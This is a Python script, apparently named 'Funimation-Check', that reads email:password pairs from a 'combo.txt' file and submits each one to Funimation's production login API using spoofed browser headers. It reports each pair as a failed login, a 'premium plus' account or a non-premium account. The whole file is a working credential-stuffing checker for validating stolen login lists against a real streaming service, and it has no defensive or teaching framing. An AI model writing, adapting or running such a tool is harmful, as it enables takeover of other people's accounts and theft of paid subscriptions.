import requests
import sys
import json
from colorama import init
init(autoreset=True)
archive_name = 'combo.txt'
contador = 0
banner = """
  ______           _                 _   _                    _____ _               _    
 |  ____|         (_)               | | (_)                  / ____| |             | |   
 | |__ _   _ _ __  _ _ __ ___   __ _| |_ _  ___  _ __ ______| |    | |__   ___  ___| | __
 |  __| | | | '_ \| | '_ ` _ \ / _` | __| |/ _ \| '_ \______| |    | '_ \ / _ \/ __| |/ /
 | |  | |_| | | | | | | | | | | (_| | |_| | (_) | | | |     | |____| | | |  __/ (__|   < 
 |_|   \__,_|_| |_|_|_| |_| |_|\__,_|\__|_|\___/|_| |_|      \_____|_| |_|\___|\___|_|\_\
                                                                                         
                                            by: xKatooo
                                            https://github.com/xKatooo
"""
print (banner)
def comboss():
    global contador
    a = open(archive_name, 'r')
    b = a.read()
    #b = correo:contra \n correo:contra
    c=b.find('\n')
    #numero de salto de linea
    combo = b[0:c]
    if combo == '':
        print('Se checkearon : ', contador-1, 'cuentas del combo')
        return print('El archivo de combos no contiene mas cuentas')

    #combo = correo:contra solo de uno
    d = open(archive_name, 'w')
    remplazo = b.replace(combo+'\n', '')
    #remplaza en b el combo por nada
    #imprime el remplazo
    d.write(remplazo)
    a.close()
    d.close()
    combo_solo = combo.find(':')
    if combo_solo == -1:
        print('No se encontro un combo valido!')
        sys.exit()
    correo = combo[0:combo_solo]
    contra = combo[combo_solo+1:c]
    url = 'https://prod-api-funimationnow.dadcdigital.com/api/auth/login/'
    r = requests.Session()
    params = {
        'username':correo,
        'password': contra
    }
    headers={
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.funimation.com',
        'territory': 'MX',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'

    }
    response = r.post(url, data=params, headers=headers)
    json_list = response.json()
    if 'error' in json_list:
        print('\033[31m'+combo,' -> Fallo de autenticacion')
    else:
        json_load = json.dumps(json_list)
        premium = json_load[35:47]
        if premium == 'premium plus':
            print('\033[42m'+combo, ' -> Premium!')
        else:
            print('\033[45m'+combo, ' -> No Premium!')
    ver()

def ver():
    global contador
    contador = contador+1
    files = open(archive_name, 'r')
    fi = files.read()
    files.close()

    di = open(archive_name, 'w')
    di.write(fi+'\n')
    di.close()

    files = open(archive_name, 'r')
    fi = files.read()
    files.close()

    if fi=='' or fi=='\n' or fi=='\n\n':
        print('Se checkearon : ', contador-1, 'cuentas del combo')
        return print('El archivo de combos no contiene mas cuentas')
    else:
        comboss()

ver()